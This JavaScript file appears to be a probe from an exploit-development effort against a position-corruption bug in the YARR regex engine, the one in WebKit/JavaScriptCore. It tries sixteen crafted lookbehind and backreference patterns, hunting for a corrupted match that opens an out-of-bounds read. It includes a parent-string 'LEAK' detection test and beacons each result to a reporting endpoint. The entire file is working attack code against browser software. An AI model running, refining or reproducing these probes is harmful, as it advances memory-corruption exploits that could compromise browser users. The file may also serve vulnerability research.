// p234-yarr-c3-success.js — Find a pattern where C3 corruption = successful match
// The C3 bug corrupts pos by -1 code unit in the lookbehind.
// All prior probes returned null because corruption makes the match fail.
// This probe tests patterns designed to SUCCEED despite corruption.
// If ANY test returns non-null, we can observe corrupted captures → OOB read path.

(function() {
  var B = "V234-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  function hexCP(s) {
    if (s === undefined) return "undef";
    if (s === null) return "null";
    if (typeof s === "number") return "n" + s;
    var r = [];
    for (var i = 0; i < s.length && i < 20; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-") || "empty";
  }

  function reportMatch(tag, m) {
    if (m === null) { beacon(tag + "-NULL"); return; }
    beacon(tag + "-MATCH-idx" + m.index + "-len" + m[0].length + "-" + hexCP(m[0]));
    for (var i = 1; i < m.length && i <= 4; i++) {
      beacon(tag + "-C" + i + "-" + hexCP(m[i]));
    }
  }

  beacon("START");

  // === A: Zero-minimum backref — \1{0,} always succeeds (0 matches ok) ===
  try {
    var re = /(?<=\u{10000}\1{0,}(.))(.)/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("A", m);
  } catch(e) { beacon("A-ERR-" + e.message.slice(0,40)); }

  // === B: No backreference at all — simpler lookbehind ===
  try {
    var re = /(?<=\u{10000}(a))b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("B", m);
  } catch(e) { beacon("B-ERR-" + e.message.slice(0,40)); }

  // === C: Capture at corrupted pos, backref OUTSIDE lookbehind ===
  // Group 2 captures at corrupted pos inside lookbehind.
  // \2 outside does reread(corrupted matchBegin) → potential OOB
  try {
    var re = /(?<=\u{10000}\1*(a)(.))\2/u;
    var m = re.exec("\u{10000}abb");
    reportMatch("C", m);
  } catch(e) { beacon("C-ERR-" + e.message.slice(0,40)); }

  // === D: Forward match then lookbehind corruption ===
  // Match 'a' forward, lookbehind fires and corrupts, (.) continues at corrupted pos
  try {
    var re = /a(?<=\u{10000}\1*(a))(.)/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("D", m);
  } catch(e) { beacon("D-ERR-" + e.message.slice(0,40)); }

  // === E: dotAll with lazy quantifier in lookbehind ===
  try {
    var re = /(?<=\u{10000}[\s\S]*?(a))b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("E", m);
  } catch(e) { beacon("E-ERR-" + e.message.slice(0,40)); }

  // === F: Backreference AFTER capture (reversed order) ===
  try {
    var re = /(?<=\u{10000}(a)\1{0,})b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("F", m);
  } catch(e) { beacon("F-ERR-" + e.message.slice(0,40)); }

  // === G: Alternation — corrupt branch fails, clean branch succeeds ===
  try {
    var re = /(?<=\u{10000}\1*(a)|(.{0,5}))b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("G", m);
  } catch(e) { beacon("G-ERR-" + e.message.slice(0,40)); }

  // === H: Explicit surrogates in lookbehind pattern ===
  try {
    var re = /(?<=[\uD800][\uDC00](a))b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("H", m);
  } catch(e) { beacon("H-ERR-" + e.message.slice(0,40)); }

  // === I: Non-greedy backref + backtracking amplification ===
  try {
    var re = /(?<=\u{10000}\1*?(a).)b/u;
    var m = re.exec("\u{10000}aab");
    reportMatch("I", m);
  } catch(e) { beacon("I-ERR-" + e.message.slice(0,40)); }

  // === J: Sequential backref chain — compound corruption ===
  try {
    var re = /(?<=\u{10000}\1*(a)\2*(a)\3*(a)\4*(a))b/u;
    var m = re.exec("\u{10000}aaaab");
    reportMatch("J", m);
  } catch(e) { beacon("J-ERR-" + e.message.slice(0,40)); }

  // === K: Nested lookbehind with outer capture ===
  try {
    var re = /(?<=(?<=\u{10000}\1*(a))(.).)b/u;
    var m = re.exec("\u{10000}abb");
    reportMatch("K", m);
  } catch(e) { beacon("K-ERR-" + e.message.slice(0,40)); }

  // === L: Replace callback with zero-min patterns ===
  try {
    var caps = [];
    var replaced = "\u{10000}ab".replace(
      /(?<=\u{10000}\1{0,}(.))(.)/u,
      function() {
        for (var i = 0; i < arguments.length; i++) {
          var v = arguments[i];
          caps.push(i + ":" + (typeof v === "string" ? hexCP(v) : v));
        }
        return "X";
      }
    );
    if (caps.length > 0) {
      beacon("L-CAPS-" + caps.join(",").slice(0, 200));
    } else {
      beacon("L-NOCAPS");
    }
  } catch(e) { beacon("L-ERR-" + e.message.slice(0,40)); }

  // === M: Replace with alternation pattern ===
  try {
    var caps2 = [];
    "\u{10000}ab".replace(
      /(?<=\u{10000}\1*(a)|(.{0,5}))b/u,
      function() {
        for (var i = 0; i < arguments.length; i++) {
          var v = arguments[i];
          caps2.push(i + ":" + (typeof v === "string" ? hexCP(v) : v));
        }
        return "X";
      }
    );
    if (caps2.length > 0) {
      beacon("M-CAPS-" + caps2.join(",").slice(0, 200));
    } else {
      beacon("M-NOCAPS");
    }
  } catch(e) { beacon("M-ERR-" + e.message.slice(0,40)); }

  // === N: Substring sharing — corrupted pos reads parent string prefix ===
  try {
    var parent = "LEAKLEAK" + "\u{10000}" + "ab";
    var sub = parent.substring(8); // starts at \u{10000}
    var re = /(?<=\u{10000}\1*(a))b/u;
    var m = re.exec(sub);
    reportMatch("N", m);
    // Even null — try replace
    var caps3 = [];
    sub.replace(/(?<=\u{10000}\1{0,}(.))(.)/u, function() {
      for (var i = 0; i < arguments.length; i++)
        caps3.push(i + ":" + (typeof arguments[i] === "string" ? hexCP(arguments[i]) : arguments[i]));
      return "X";
    });
    if (caps3.length > 0) {
      beacon("N-SUBCAPS-" + caps3.join(",").slice(0, 200));
      // Check if any capture contains "LEAK" chars
      for (var i = 0; i < caps3.length; i++) {
        if (caps3[i].indexOf("004c") >= 0 || caps3[i].indexOf("0045") >= 0) {
          beacon("N-PARENT-LEAK-" + caps3[i]);
        }
      }
    }
  } catch(e) { beacon("N-ERR-" + e.message.slice(0,40)); }

  // === O: Backref to self-referencing group with surrogate padding ===
  try {
    var re = /(?<=\u{10000}(a|(?=\1))*)b/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("O", m);
  } catch(e) { beacon("O-ERR-" + e.message.slice(0,40)); }

  // === P: The forward-capture-then-lookbehind pattern from combinator idea 7 ===
  try {
    var re = /(a)(?<=\u{10000}\1*(a))(.)/u;
    var m = re.exec("\u{10000}ab");
    reportMatch("P", m);
  } catch(e) { beacon("P-ERR-" + e.message.slice(0,40)); }

  beacon("DONE");
})();
